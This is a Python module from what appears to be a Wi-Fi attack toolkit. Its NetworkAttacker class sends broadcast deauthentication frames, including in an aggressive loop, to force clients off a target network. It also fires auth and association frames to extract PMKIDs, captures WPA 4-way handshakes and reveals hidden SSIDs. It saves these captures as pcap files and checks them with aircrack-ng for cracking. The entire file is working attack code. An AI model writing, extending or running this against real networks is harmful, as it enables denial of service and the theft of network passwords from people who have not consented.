import time
import os
import threading
import subprocess
from scapy.all import (
    sniff, sendp, wrpcap, RadioTap, Dot11, Dot11Elt, Dot11ProbeReq,
    Dot11Auth, Dot11AssoReq, EAPOL
)
from deauth import BaseAttacker
from config import HANDSHAKES_DIR, C_GREEN, C_RED, C_YELLOW, C_CYAN, C_RESET
from utils import get_vendor, get_current_time_12h
from logger import logger


class NetworkAttacker(BaseAttacker):
    def __init__(self, interface, target_bssid, target_channel, db_handler,
                 attack_mode="reveal", target_ssid="Unknown"):
        super().__init__(interface, target_bssid, target_channel)
        self.db = db_handler
        self.target_ssid = target_ssid
        self.attack_mode = attack_mode

        self.stop_attack = False
        self.success = False
        self.result_data = None

        self.handshake_captured = False
        self.pmkid_captured = False
        self.handshake_filename = ""
        self.eapol_packets = []
        self.best_beacon = None
        self.ssid_packets = []

        self.auth_packets = []
        self.assoc_packets = []
        self.probe_req_packets = []

        self.threads = []
        self.deauth_event = threading.Event()
        self.sniff_count = 0

    def start_deauth_thread(self):
        if self.attack_mode == "passive":
            return
        self.deauth_event.clear()
        if self.attack_mode == "pmkid":
            t = threading.Thread(target=self._pmkid_attack_loop, daemon=True)
        elif self.attack_mode == "deauth_only":
            t = threading.Thread(target=self._deauth_loop_aggressive, daemon=True)
        else:
            t = threading.Thread(target=self._attack_loop, daemon=True)
        t.start()
        self.threads.append(t)

    def join_threads(self):
        self.stop_attack = True
        self.stop_deauth = True
        self.deauth_event.set()
        for t in self.threads:
            if t.is_alive():
                t.join(timeout=1.0)

    def _pmkid_attack_loop(self):
        try:
            my_mac = self._get_interface_mac()
            pkt_auth = (RadioTap() / Dot11(addr1=self.target_bssid, addr2=my_mac,
                        addr3=self.target_bssid) / Dot11Auth(algo=0, seqnum=1, status=0))
            pkt_assoc = (RadioTap() / Dot11(addr1=self.target_bssid, addr2=my_mac,
                         addr3=self.target_bssid) / Dot11AssoReq(cap=0x1100, listen_interval=0x00a)
                         / Dot11Elt(ID=0, info=self.target_ssid))
            while not self.stop_attack and not self.pmkid_captured:
                try:
                    sendp(pkt_auth, iface=self.interface, verbose=False, count=1)
                    time.sleep(0.1)
                    if self.target_ssid != "Unknown":
                        sendp(pkt_assoc, iface=self.interface, verbose=False, count=1)
                except Exception as e:
                    logger.debug(f"PMKID TX failed: {e}")
                time.sleep(1)
        except Exception as e:
            logger.error(f"PMKID Thread Crash: {e}")

    def _attack_loop(self):
        try:
            pkt_probe = (RadioTap() / Dot11(addr1=self.target_bssid,
                         addr2=self._get_interface_mac(),
                         addr3=self.target_bssid) / Dot11ProbeReq() / Dot11Elt(ID="SSID", info=""))
            while not self.stop_attack:
                if self.success and self.attack_mode == "reveal":
                    break
                if self.handshake_captured and self.attack_mode == "handshake":
                    break
                try:
                    self._send_deauth_broadcast(count=10)
                    if self.attack_mode not in ["handshake", "deauth_only"]:
                        sendp(pkt_probe, iface=self.interface, count=1, verbose=False)
                except Exception as e:
                    logger.debug(f"Attack Loop Error: {e}")
                time.sleep(1)
        except Exception as e:
            logger.error(f"Attack Thread Crash: {e}")

    def interface_mac(self):
        return self._get_interface_mac()

    def sniffer_callback(self, pkt):
        self.sniff_count += 1
        if self.stop_attack and self.attack_mode == "deauth_only":
            return
        if self.success and self.attack_mode == "reveal":
            return
        if self.pmkid_captured and self.attack_mode == "pmkid":
            return

        if hasattr(self, 'extended_capture_start'):
            elapsed = time.time() - self.extended_capture_start
            if elapsed > 10 and not self.handshake_captured:
                self.save_handshake()
                return

        if self.handshake_captured and self.attack_mode == "handshake":
            if self.target_ssid not in ("Unknown", "<HIDDEN>"):
                return

        try:
            if pkt.haslayer(Dot11):
                addr1 = pkt.addr1.lower() if pkt.addr1 else ""
                addr2 = pkt.addr2.lower() if pkt.addr2 else ""
                addr3 = pkt.addr3.lower() if pkt.addr3 else ""

                # Beacon capture
                if pkt.type == 0 and pkt.subtype == 8:
                    if addr2 == self.target_bssid or addr3 == self.target_bssid:
                        if not self.best_beacon:
                            self.best_beacon = pkt
                        elif pkt.haslayer(RadioTap):
                            new_rssi = getattr(pkt[RadioTap], 'dBm_AntSignal', -100) or -100
                            old_rssi = -100
                            if self.best_beacon.haslayer(RadioTap):
                                old_rssi = getattr(self.best_beacon[RadioTap], 'dBm_AntSignal', -100) or -100
                            if new_rssi > old_rssi:
                                self.best_beacon = pkt

                # Auth frames
                if pkt.type == 0 and pkt.subtype == 11:
                    if self.target_bssid in [addr1, addr2, addr3]:
                        if pkt not in self.auth_packets:
                            self.auth_packets.append(pkt)

                # Assoc/Reassoc frames
                if pkt.type == 0 and pkt.subtype in [0, 1, 2, 3]:
                    if self.target_bssid in [addr1, addr2, addr3]:
                        if pkt not in self.assoc_packets:
                            self.assoc_packets.append(pkt)

                # Probe request frames
                if pkt.type == 0 and pkt.subtype == 4:
                    if addr1 == "ff:ff:ff:ff:ff:ff" or self.target_bssid in [addr1, addr3]:
                        if pkt not in self.probe_req_packets:
                            self.probe_req_packets.append(pkt)

                # Client discovery
                client_mac = None
                if self.target_bssid == addr1 and addr2 != "ff:ff:ff:ff:ff:ff" and not addr2.startswith("33:33"):
                    client_mac = addr2
                elif self.target_bssid == addr2 and addr1 != "ff:ff:ff:ff:ff:ff" and not addr1.startswith("33:33"):
                    client_mac = addr1

                if client_mac:
                    known = any(c == client_mac for c, _ in self.clients)
                    if not known:
                        vendor = get_vendor(client_mac)
                        self.clients.add((client_mac, vendor))

                if self.attack_mode == "deauth_only":
                    return

            # EAPOL capture
            if pkt.haslayer(EAPOL):
                if self.target_bssid in [addr1, addr2]:
                    if pkt.haslayer(Raw) or len(bytes(pkt)) > 100:
                        is_duplicate = any(bytes(pkt) == bytes(ep) for ep in self.eapol_packets)
                        if not is_duplicate:
                            self.eapol_packets.append(pkt)
                            logger.debug(f"EAPOL {len(self.eapol_packets)}/4 from {addr1}<->{addr2}")
                            if len(self.eapol_packets) >= 4 and not self.handshake_captured:
                                if not hasattr(self, 'extended_capture_start'):
                                    self.extended_capture_start = time.time()
                                    logger.info("4 EAPOL packets captured, collecting context frames...")
                                    print(f"\n{C_GREEN}[+] 4-way handshake captured! Collecting context frames...{C_RESET}")

            # SSID reveal
            if self.target_ssid in ("Unknown", "<HIDDEN>") or self.attack_mode == "reveal":
                if pkt.type == 0 and pkt.subtype in [0, 2, 4, 5, 8]:
                    if self.target_bssid in [addr1, addr2, addr3]:
                        if pkt.haslayer(Dot11Elt):
                            try:
                                elt = pkt.getlayer(Dot11Elt)
                                while elt:
                                    if elt.ID == 0:
                                        ssid = elt.info.decode('utf-8', errors='ignore')
                                        if ssid and not ssid.startswith("\x00") and len(ssid) > 0:
                                            if pkt not in self.ssid_packets:
                                                self.ssid_packets.append(pkt)
                                            self.target_ssid = ssid
                                            self.db.save(self.target_bssid, ssid)
                                            self.result_data = {
                                                "SSID": ssid, "BSSID": self.target_bssid,
                                                "Channel": self.target_channel,
                                                "Clients": len(self.clients)
                                            }
                                            if self.attack_mode in ("reveal", "passive"):
                                                self.success = True
                                                self.stop_attack = True
                                            return
                                    elt = elt.payload
                            except Exception as e:
                                logger.debug(f"ELT parsing error: {e}")
        except Exception:
            pass

    def save_handshake(self, suffix=""):
        safe_ssid = "".join(c for c in self.target_ssid if c.isalpha() or c.isdigit() or c == ' ').strip()
        if not safe_ssid or safe_ssid == "<HIDDEN>":
            safe_ssid = "Unknown_SSID"
        filename = f"{self.target_bssid.replace(':', '-')}_{safe_ssid}{suffix}.pcap"
        full_path = os.path.join(HANDSHAKES_DIR, filename)

        if not self.eapol_packets or len(self.eapol_packets) < 2:
            logger.warning("Insufficient EAPOL packets for handshake save")
            return

        packets_to_save = []
        if self.best_beacon:
            packets_to_save.append(self.best_beacon)
        if self.probe_req_packets:
            packets_to_save.extend(self.probe_req_packets)
        if self.ssid_packets:
            packets_to_save.extend(self.ssid_packets)
        if self.auth_packets:
            packets_to_save.extend(self.auth_packets)
        if self.assoc_packets:
            packets_to_save.extend(self.assoc_packets)
        packets_to_save.extend(self.eapol_packets)

        if len(packets_to_save) < 2:
            logger.error("Insufficient packets for valid handshake")
            return

        try:
            wrpcap(full_path, packets_to_save)
            logger.info(f"Saved {len(packets_to_save)} packets to {full_path}")

            print(f"\n{C_YELLOW}[*] Verifying handshake quality...{C_RESET}")
            print(f"{C_CYAN}    Total packets: {len(packets_to_save)}{C_RESET}")
            print(f"{C_CYAN}    Beacon: {'Yes' if self.best_beacon else 'No'}{C_RESET}")
            if self.auth_packets:
                print(f"{C_CYAN}    Auth frames: {len(self.auth_packets)}{C_RESET}")
            if self.assoc_packets:
                print(f"{C_CYAN}    Assoc frames: {len(self.assoc_packets)}{C_RESET}")
            print(f"{C_CYAN}    EAPOL: {len(self.eapol_packets)}{C_RESET}")

            if self.auth_packets and self.assoc_packets:
                print(f"{C_GREEN}    [OK] Auth/Assoc frames present (hcxpcapngtool compatible){C_RESET}")

            cmd = ["aircrack-ng", full_path]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=10)

            if "1 handshake" in proc.stdout:
                self.handshake_captured = True
                self.handshake_filename = full_path
                self.success = True
                if self.db:
                    self.db.update_handshake(self.target_bssid, True, get_current_time_12h(), full_path)
                if self.attack_mode == "handshake":
                    self.stop_attack = True
                print(f"{C_GREEN}[+] VALID HANDSHAKE CONFIRMED!{C_RESET}")
                print(f"{C_GREEN}    File: {full_path}{C_RESET}")
                logger.info(f"Valid handshake confirmed for {self.target_bssid}")
            else:
                print(f"{C_RED}[-] Handshake verification failed{C_RESET}")
                if "No networks found" in proc.stdout:
                    print(f"{C_YELLOW}    Issue: No networks found in capture{C_RESET}")
                elif "Got no data packets" in proc.stdout or "0 handshake" in proc.stdout:
                    print(f"{C_YELLOW}    Issue: Incomplete 4-way handshake ({len(self.eapol_packets)} EAPOL){C_RESET}")
                else:
                    for line in proc.stdout.split('\n')[:5]:
                        if line.strip():
                            print(f"    {line}")
                logger.info(f"Saved incomplete handshake to {full_path} for manual review")
                print(f"{C_CYAN}    File saved for manual review: {full_path}{C_RESET}")
                self.eapol_packets = []

        except subprocess.TimeoutExpired:
            logger.error("Aircrack-ng verification timed out")
            print(f"{C_RED}[!] Verification timed out{C_RESET}")
        except Exception as e:
            logger.error(f"Save Error: {e}")
            print(f"{C_RED}[!] Error saving handshake: {e}{C_RESET}")
